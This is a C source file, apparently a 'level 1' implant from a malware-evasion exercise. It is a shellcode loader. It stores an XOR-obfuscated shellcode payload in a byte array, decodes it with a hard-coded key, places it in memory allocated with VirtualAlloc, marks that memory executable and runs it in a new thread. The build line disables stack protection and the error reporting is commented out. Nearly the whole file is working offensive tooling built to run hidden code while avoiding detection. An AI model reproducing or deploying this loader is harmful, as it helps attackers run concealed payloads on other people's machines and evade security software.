/// Compile With:
/// cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /I "headers" /link /OUT:executables\level1.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

/// User defined headers
#include "obfuscators.h"

// Payload String - Level 1
unsigned char payload[] = {
0x9d, 0x2a, 0xe0, 0x80, 0x95, 0x8e, 0xa7, 0x68, 0x69, 0x6a, 0x2a, 0x3d, 0x2c,
0x3e, 0x3d, 0x21, 0x27, 0x3a, 0x42, 0xa6, 0x10, 0x3e, 0xfc, 0x2a, 0x19, 0x32,
0xea, 0x30, 0x7b, 0x2c, 0xee, 0x34, 0x47, 0x20, 0xe2, 0x18, 0x3b, 0x24, 0x62,
0xd9, 0x25, 0x3a, 0x3c, 0x43, 0xba, 0x3c, 0x44, 0xb6, 0xdb, 0x44, 0x18, 0x06,
0x63, 0x4e, 0x43, 0x25, 0xa4, 0xaf, 0x6a, 0x29, 0x68, 0xab, 0x89, 0x81, 0x3f,
0x2f, 0x3e, 0x38, 0xfa, 0x20, 0x53, 0xff, 0x37, 0x4a, 0x3f, 0x79, 0xa9, 0xf1,
0xe1, 0xea, 0x63, 0x64, 0x65, 0x2e, 0xe2, 0xa8, 0x1d, 0x0d, 0x23, 0x6d, 0xbd,
0x3e, 0xe4, 0x38, 0x69, 0x36, 0xf8, 0x34, 0x55, 0x3f, 0x76, 0xa8, 0x9a, 0x2c,
0x29, 0x9d, 0xaa, 0x25, 0xee, 0x52, 0xef, 0x20, 0x68, 0xbc, 0x26, 0x5d, 0xa4,
0x26, 0x5e, 0xb0, 0xdd, 0x33, 0xb2, 0xbd, 0x78, 0x37, 0x76, 0xb9, 0x41, 0x9a,
0x14, 0x93, 0x2f, 0x67, 0x29, 0x42, 0x6f, 0x2d, 0x50, 0xbb, 0x1e, 0xb4, 0x35,
0x2a, 0xe4, 0x30, 0x55, 0x3b, 0x72, 0xa4, 0x13, 0x37, 0xfc, 0x74, 0x31, 0x3e,
0xea, 0x22, 0x7f, 0x2d, 0x64, 0xb6, 0x26, 0xe3, 0x6d, 0xe2, 0x23, 0x6d, 0xbd,
0x2f, 0x37, 0x31, 0x29, 0x2c, 0x2a, 0x2e, 0x34, 0x2e, 0x36, 0x21, 0x38, 0x20,
0x29, 0xe1, 0x8f, 0x44, 0x24, 0x34, 0x98, 0x88, 0x31, 0x2b, 0x32, 0x36, 0x25,
0xe5, 0x7d, 0x99, 0x26, 0x8d, 0x8c, 0x8b, 0x28, 0x3e, 0xcd, 0x79, 0x79, 0x7a,
0x61, 0x62, 0x63, 0x64, 0x65, 0x2e, 0xea, 0xe5, 0x68, 0x6b, 0x6b, 0x6c, 0x2c,
0xd4, 0x5e, 0xfb, 0x1e, 0xf5, 0x8c, 0xa1, 0xce, 0x86, 0xc2, 0xda, 0x2f, 0x3b,
0xdb, 0xc4, 0xf6, 0xd9, 0xf8, 0x99, 0xb2, 0x20, 0xea, 0xae, 0x43, 0x50, 0x6b,
0x12, 0x65, 0xf0, 0x8a, 0x92, 0x06, 0x71, 0xce, 0x31, 0x64, 0x0a, 0x16, 0x10,
0x61, 0x3b, 0x22, 0xed, 0xbf, 0x99, 0xb2, 0x0b, 0x08, 0x06, 0x08, 0x42, 0x08,
0x16, 0x0a, 0x70};

// Length of payload array
unsigned int payload_len = (unsigned int)(sizeof(payload)/sizeof(payload[0]));

// XOR key
const char XOR_KEY[] = "abcdefghijklmnopqrstuvwxyz";

// Length of XOR key
unsigned int xor_key_len = (int)(sizeof(XOR_KEY)/sizeof(XOR_KEY[0]))-1;

  
/// Main Function
///
/// Returns
///  0 - OK
/// -1 - VirtualAlloc() failed
/// -2 - VirtualProtect() failed
/// -3 - CreateThread() failed
/// -4 - WaitForSingleObject() failed
int main(void){
    BOOL rv;
    HANDLE th;
    DWORD _event = 0;
    void * exec_mem;
    DWORD oldprotect = 0;

    // Allocate a memory buffer for payload
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL){
        // fprintf(stderr, "VirtualAlloc Failed with error code: %d\n", GetLastError());
        return -1;
    }
    
    XOR(payload, payload_len, XOR_KEY, xor_key_len);

    // Copy payload to new buffer
    RtlMoveMemory(exec_mem, payload, payload_len);

    // Make new buffer as executable
    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if ( rv == 0 ) {
        // fprintf(stderr, "VirtualProtect Failed with error code: %d\n", GetLastError());
        return -2;
    }

    // Create Thread To run shellcode
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
    if (th == NULL){
        // fprintf(stderr, "CreateThread Failed with error code: %d\n", GetLastError());
        return -3;
    }

    _event = WaitForSingleObject(th, -1);
    if(_event == WAIT_FAILED){
        // fprintf(stderr, "WaitForSingleObject Failed with error code: %d\n", GetLastError());
        return -4;
    }
  
    return 0;
}